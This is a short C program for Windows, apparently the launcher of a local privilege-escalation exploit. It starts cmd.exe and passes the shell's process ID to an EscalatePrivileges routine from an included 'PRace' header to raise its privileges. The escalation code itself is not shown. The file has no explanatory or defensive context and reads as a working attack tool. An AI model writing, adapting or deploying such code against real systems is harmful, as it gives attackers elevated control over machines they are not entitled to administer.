#include "..\\PRace\\PRace.h"
#include <Shlwapi.h>
int __cdecl main()
{
	STARTUPINFOA si = {0}; 
	PROCESS_INFORMATION pi = {0};

	STARTUPINFOA si2 = {0}; 
	PROCESS_INFORMATION pi2 = {0};

	CHAR lpszPath[_MAX_PATH]; 
	
	ExpandEnvironmentStringsA("%SYSTEMROOT%\\System32\\CMD.EXE", lpszPath, _MAX_PATH); 

	if (CreateProcessA(lpszPath, 0, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		Sleep(100);
		EscalatePrivileges(pi.dwProcessId);
	}
	ExitProcess(0);

	return 0;
}

